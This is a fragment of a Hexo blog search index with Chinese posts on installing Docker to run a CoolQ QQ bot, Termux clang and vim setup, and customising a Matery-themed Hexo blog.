href="http://tieba.baidu.com/p/6123618973?share=9105&fr=share&see_lz=0&sfc=copy&client_type=2&client_version=11.4.8.6&st=1590794609&unique=44F840BD5AAD68B9F62C9D899852F777" title="点我" target="_blank" rel="noopener">点我</a></p>]]></content>
      
      
      <categories>
          
          <category> 设备体验 </category>
          
          <category> 鼓捣 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pebble </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mac平台Docker容器配合酷q实现qq机器人（踩坑指南）</title>
      <link href="/2020/05/28/mac-ping-tai-docker-rong-qi-pei-he-ku-q-shi-xian-qq-ji-qi-ren-cai-keng-zhi-nan/"/>
      <url>/2020/05/28/mac-ping-tai-docker-rong-qi-pei-he-ku-q-shi-xian-qq-ji-qi-ren-cai-keng-zhi-nan/</url>
      
        <content type="html"><![CDATA[<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><blockquote><p>win系统的话此教程基本无用，这里只针对基于mac或者其他linux系统（当然win装个xshell模拟终端也行）此处<a href="https://cqp.cc/t/34558" target="_blank" rel="noopener">项目官方文档</a>目前已关闭注册.话不多说，开始！</p></blockquote><h2 id="在你的机器上安装docker-ce"><a href="#在你的机器上安装docker-ce" class="headerlink" title="在你的机器上安装docker ce"></a>在你的机器上安装<code>docker ce</code></h2><p><strong>1.卸载机器上可能存在的docker</strong></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> update//更新APT库<span class="token function">sudo</span> <span class="token function">apt-get</span> upgrade<span class="token function">sudo</span> <span class="token function">apt-get</span> remove docker docker-engine docker.io//卸载机器上可能存在的docker<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>2.安装</strong></p><ul><li>由于 apt 源使用 HTTPS 因此，需要添加使用HTTPS 传输的软件包以及 CA 证书。</li></ul><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> update<span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> \    apt-transport-https \    ca-certificates \    curl \    software-properties-common<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>把官方源替换为清华源，同时添加软件源的 GPG 密钥和docker软件源</li></ul><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#1.官方源替换为清华源</span>curl -fsSL https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu/gpg <span class="token operator">|</span> <span class="token function">sudo</span> apt-key add -<span class="token comment" spellcheck="true">#官方源操作方法</span><span class="token comment" spellcheck="true">#curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -</span><span class="token comment" spellcheck="true">#2.添加软件源的 GPG 密钥和docker软件源</span><span class="token function">sudo</span> add-apt-repository \<span class="token string">"deb [arch=amd64] https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu \<span class="token variable"><span class="token variable">$(</span>lsb_release -cs<span class="token variable">)</span></span> \stable"</span><span class="token comment" spellcheck="true">#官方源</span><span class="token comment" spellcheck="true">#sudo add-apt-repository \</span><span class="token comment" spellcheck="true">#"deb [arch=amd64] https://download.docker.com/linux/ubuntu \</span><span class="token comment" spellcheck="true">#$(lsb_release -cs) \</span><span class="token comment" spellcheck="true">#stable</span><span class="token comment" spellcheck="true">#3.更新APT</span><span class="token function">sudo</span> <span class="token function">apt-get</span> update<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>安装docker并启动,测试正确性。</li></ul><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> docker-ce<span class="token function">sudo</span> systemctl <span class="token function">enable</span> docker<span class="token function">sudo</span> systemctl start docker<span class="token function">sudo</span> docker run hello-world<span class="token comment" spellcheck="true">#出现以下信息则安装成功</span>Unable to <span class="token function">find</span> image <span class="token string">'hello-world:latest'</span> locallylatest: Pulling from library/hello-worldca4f61b1923c: Pull complete Digest: sha256:445b2fe9afea8b4aa0b2f27fe49dd6ad130dfe7a8fd0832be5de99625dad47cdStatus: Downloaded newer image <span class="token keyword">for</span> hello-world:latestHello from Docker<span class="token operator">!</span>This message shows that your installation appears to be working correctly.To generate this message, Docker took the following steps: 1. The Docker client contacted the Docker daemon. 2. The Docker daemon pulled the <span class="token string">"hello-world"</span> image from the Docker Hub.    <span class="token punctuation">(</span>amd64<span class="token punctuation">)</span> 3. The Docker daemon created a new container from that image <span class="token function">which</span> runs the    executable that produces the output you are currently reading. 4. The Docker daemon streamed that output to the Docker client, <span class="token function">which</span> sent it    to your terminal.To try something <span class="token function">more</span> ambitious, you can run an Ubuntu container with: $ docker run -it ubuntu <span class="token function">bash</span>Share images, automate workflows, and <span class="token function">more</span> with a <span class="token function">free</span> Docker ID: https://cloud.docker.com/For <span class="token function">more</span> examples and ideas, visit: https://docs.docker.com/engine/userguide/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="镜像加速"><a href="#镜像加速" class="headerlink" title="镜像加速"></a>镜像加速</h3><p> <strong><code>/etc/docker/daemon.json</code>写入以下内容</strong></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">{</span><span class="token string">"registry-mirrors"</span><span class="token keyword">:</span> <span class="token punctuation">[</span>    <span class="token string">"https://registry.docker-cn.com"</span>    <span class="token punctuation">]</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>应用修改并重启</strong></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> systemctl daemon-reload<span class="token function">sudo</span> systemctl restart docker<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>至此，<code>docker</code>环境OK。</strong></p><h2 id="进行酷q相关配置"><a href="#进行酷q相关配置" class="headerlink" title="进行酷q相关配置"></a>进行酷q相关配置</h2><blockquote><p>不巧的是目前<a href="https://cqp.cc/t/34558" target="_blank" rel="noopener">酷q官网</a>已关闭注册（还好我注册的早qaq），同时酷q只支持x86_64平台,要保证自己的<code>ecs</code>/机器 上的对应端口是开放的。</p></blockquote><h3 id="下载并初始化"><a href="#下载并初始化" class="headerlink" title="下载并初始化"></a>下载并初始化</h3><pre class="line-numbers language-bash"><code class="language-bash">docker pull coolq/wine-coolq//下载 酷Q Docker 镜像<span class="token function">mkdir</span> /root/coolq-data <span class="token comment" spellcheck="true"># 任意路径均可(存放 酷Q 数据)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="运行酷Q镜像"><a href="#运行酷Q镜像" class="headerlink" title="运行酷Q镜像"></a>运行酷Q镜像</h3><pre class="line-numbers language-bash"><code class="language-bash">docker run --name<span class="token operator">=</span>coolq --rm -p <span class="token variable"><span class="token variable">`</span>开放的端口号<span class="token variable">`</span></span>:9000 -v <span class="token variable"><span class="token variable">`</span>刚才创建文件夹的绝对路径<span class="token variable">`</span></span>:/home/user/coolq -e VNC_PASSWD<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span>机器人密码<span class="token variable">`</span></span> -e COOLQ_ACCOUNT<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span>机器人账号<span class="token variable">`</span></span> coolq/wine-coolq<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="访问"><a href="#访问" class="headerlink" title="访问"></a>访问</h3><p>1.以上操作进行完当你看到[CQDaemon] Started CoolQ 说明已启动成功<br>2.浏览器中访问<code>http://你的服务器IP:你的端口</code>即可访问.</p><h2 id="服务器端实现酷q进程后台运行"><a href="#服务器端实现酷q进程后台运行" class="headerlink" title="服务器端实现酷q进程后台运行"></a>服务器端实现酷q进程后台运行</h2><blockquote><p>原因：SIGHUP信号导致ssh关闭，正在运行的程序会死掉.</p></blockquote><h3 id="screen命令"><a href="#screen命令" class="headerlink" title="screen命令"></a>screen命令</h3><blockquote><p>流行的Linux发行版通常会自带screen实用程序，没有的话，可以从GNU screen的官方网站下载</p></blockquote><p>1).输入<code>screen</code>后会车进入子界面，<br>2).执行你的后台代码<br>3).<code>按ctrl+a再按d</code>切换至后台会显示<code>[detached]的字样</code>此时断开<code>ssh</code>也能后台执行了。<br>4).停止后台：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">screen</span> –ls <span class="token comment" spellcheck="true">#显示后台信息</span><span class="token function">screen</span> –r <span class="token comment" spellcheck="true">#切换至对应子界面</span><span class="token comment" spellcheck="true"># ctrl+d结束子界面</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>也可以：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#如果有 N 个screen，关闭所有screen</span><span class="token function">screen</span> -ls<span class="token operator">|</span><span class="token function">awk</span> <span class="token string">'NR>=2&amp;&amp;NR&lt;=N{print <span class="token variable">$1</span>}'</span><span class="token operator">|</span><span class="token function">awk</span> <span class="token string">'{print "screen -S "<span class="token variable">$1</span>" -X quit"}'</span><span class="token operator">|</span>sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>附：<a href="https://blog.csdn.net/allenting_wu/article/details/89365837" target="_blank" rel="noopener">screen推荐教程</a></p><blockquote><p>如发生进程一场中断，也可以使用<code>Supervisor</code>自动唤起。<a href="https://blog.csdn.net/oZhengTuoJiaSuo/article/details/102698581" target="_blank" rel="noopener">Supervisor推荐教程</a></p></blockquote><h2 id="服务器和本地机拷贝文件"><a href="#服务器和本地机拷贝文件" class="headerlink" title="服务器和本地机拷贝文件"></a>服务器和本地机拷贝文件</h2><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 假设服务器IP地址为xxxx</span><span class="token comment" spellcheck="true"># 1.从服务器复制文件到本地：</span><span class="token function">scp</span> root@192.168.1.100:/data/test.txt /home/myfile/<span class="token comment" spellcheck="true"># 2.从服务器复制文件夹到本地：</span><span class="token function">scp</span> -r root@192.168.1.100:/data/ /home/myfile/<span class="token comment" spellcheck="true"># 3.从本地复制文件到服务器：</span><span class="token function">scp</span> /home/myfile/test.txt root@192.168.1.100:/data/<span class="token comment" spellcheck="true"># 4.从本地复制文件夹到服务器：</span><span class="token function">scp</span> -r /home/myfile/ root@192.168.1.100:/data/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="结束"><a href="#结束" class="headerlink" title="结束"></a>结束</h2><blockquote><p>如果你完成了以上操作，那么你的机器人就可以后台自己跑起来了。</p></blockquote><p>附参考：<a href="https://blog.csdn.net/oZhengTuoJiaSuo/article/details/102698581" target="_blank" rel="noopener">阿里云CentOS7下Supervisor安装与配置</a>，<a href="https://blog.csdn.net/oZhengTuoJiaSuo/article/details/102698581" target="_blank" rel="noopener">Supervisor自动唤起进程</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Termux操作汇总</title>
      <link href="/2020/05/28/termux-cao-zuo-hui-zong/"/>
      <url>/2020/05/28/termux-cao-zuo-hui-zong/</url>
      
        <content type="html"><![CDATA[<h2 id="一：软件安装"><a href="#一：软件安装" class="headerlink" title="一：软件安装"></a>一：软件安装</h2><h3 id="1-安装clang"><a href="#1-安装clang" class="headerlink" title="1.安装clang"></a>1.安装clang</h3><h4 id="1-1过程"><a href="#1-1过程" class="headerlink" title="1.1过程"></a>1.1过程</h4><p><strong>升级并安装clang编译器和vi</strong><br><code>bashapt update;apt install clang;apt install vim</code><br><strong>编辑c程序：</strong><br><code>bashvim hello</code><br><strong>编译：</strong><br><code>bashclang hello.c//或者：gcc hello.c -o name.o</code><br><strong>执行生成的编译文件:</strong><br><code>name.o</code></p><h4 id="1-2增加vi中文注释支持"><a href="#1-2增加vi中文注释支持" class="headerlink" title="1.2增加vi中文注释支持"></a>1.2增加vi中文注释支持</h4><p><strong>根目录下修改.vimrc文件</strong></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cd</span> ~ //切换到根vim .vimrc //编辑<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>写入配置信息</strong></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">set</span> encoding<span class="token operator">=</span>utf-8<span class="token keyword">set</span> fileencodings<span class="token operator">=</span>ucs-bom,utf-8,cp936,gb18030<span class="token keyword">set</span> termencoding<span class="token operator">=</span>utf-8<span class="token keyword">set</span> expandtab<span class="token keyword">set</span> ts<span class="token operator">=</span>4<span class="token keyword">set</span> shiftwidth<span class="token operator">=</span>4<span class="token keyword">set</span> nusyntax on<span class="token keyword">if</span> has<span class="token punctuation">(</span><span class="token string">'mouse'</span><span class="token punctuation">)</span><span class="token keyword">set</span> mouse-<span class="token operator">=</span>aendif<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
          <category> 鼓捣 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Termux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo+github+coding+matry搭建双路博客</title>
      <link href="/2020/05/27/hexo-github-coding-matry-da-jian-shuang-lu-bo-ke/"/>
      <url>/2020/05/27/hexo-github-coding-matry-da-jian-shuang-lu-bo-ke/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>第一次正式搭建个人博客，想通过它来记录一些学习过程中经常遗忘的代码和一些折腾的过程。搭建博客的方式和工具都有很多种选择，我采用的是Hexo+github的方式进行搭建。选择这种方式的原因很简单，我也考虑过采用反向穿透配合nginx的方式进行搭建，无奈服务器的价钱都不便宜。得益于github不收费，并且速度还可以，所以对于我来时是个更好的选择。</p><h2 id="魔改"><a href="#魔改" class="headerlink" title="魔改"></a>魔改</h2><blockquote><p>本文不讲具体的每一步细节，毕竟网上这种文章太多了，只记录一些好玩的魔改。</p></blockquote><h3 id="调色篇"><a href="#调色篇" class="headerlink" title="调色篇"></a>调色篇</h3><p>好玩的工具：<a href="http://tools.jb51.net/static/colorpicker/" target="_blank" rel="noopener">在线颜色选择器 | RGB颜色查询对照表</a><br>主要针对<code>themes\Matery\source\css\matery.css</code>,<code>themes\Matery\layout\_partial\bg-cover-content.ejs</code>和<code>themes\Matery\layout\_partial\post-detail-toc.ejs</code>这三个文件的修改。</p><h4 id="matery-css文件"><a href="#matery-css文件" class="headerlink" title="matery.css文件"></a>matery.css文件</h4><ul><li>主页的渐变动画去除</li></ul><p>打开<code>matery.css</code>文件搜索<code>.bg-cover:after</code>注释掉所在代码块即可。</p><ul><li>博客背景壁纸修改</li></ul><p><code>matery.css</code>中搜索<code>body</code>,其中<code>url(****)</code>括号内替换为自己想要的效果，或者喜欢纯色直接修改<code>rgna</code>括号内的rgb值即可。</p><h4 id="bg-cover-content-ejs文件"><a href="#bg-cover-content-ejs文件" class="headerlink" title="bg-cover-content.ejs文件"></a>bg-cover-content.ejs文件</h4><ul><li>修改主页轮播图</li></ul><p>1.主题配置文件_config.yml中取消掉或者固定显示轮播图。<br>2.bg-cover-content.ejs中搜索<code>&lt;% if (theme.banner.enable) { %&gt;&lt;script&gt;</code>所在代码块的<code>url（****）</code>其中<em>**</em>替换为自己想要的图片链接地址即可。</p><h4 id="post-detail-toc-ejs"><a href="#post-detail-toc-ejs" class="headerlink" title="post-detail-toc.ejs"></a>post-detail-toc.ejs</h4><ul><li>文章侧旁目录背景颜色</li></ul><p>搜索代码 <code>.toc-widget {width: 345px;padding-left: 20px;</code>，更改<code>background-color:</code>属性的rgb值即可。</p><h2 id="出现的问题"><a href="#出现的问题" class="headerlink" title="出现的问题"></a>出现的问题</h2><ul><li>github出现The CNAME godweiyang.com is already taken.</li></ul><p>解决办法：删除站点所有<code>CNAME</code>文件。</p><ul><li>不蒜子统计计数本地数据不正常</li></ul><p>解决：没提交。。。。</p><ul><li>不蒜子与love2d动画冲突</li></ul><p>首先为便于修改，把不蒜子的插件下载到本地，我的在<code>/Hexo/themes/matery/source/libs/others</code>,搜索<code>b.style.display=&quot;none&quot;</code>,把<code>none</code>去掉即可。</p><ul><li>文章加密</li></ul><p>文章中设置SHA256加密的password值，并在——config.yml激活加密功能<br><a href="http://www.jsons.cn/sha/" target="_blank" rel="noopener">在线加密</a></p><p>链接：<a href="https://www.baidu.com/s?wd=%E5%A6%82%E4%BD%95hexo%2Bgithub%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2&tn=84053098_3_dg&ie=utf-8/" title="超详细Hexo+Github博客搭建小白教程" target="_blank" rel="noopener">超详细Hexo+Github博客搭建小白教程</a> 。。</p>]]></content>
      
      
      <categories>
          
          <category> 折腾 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 第一个博客 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
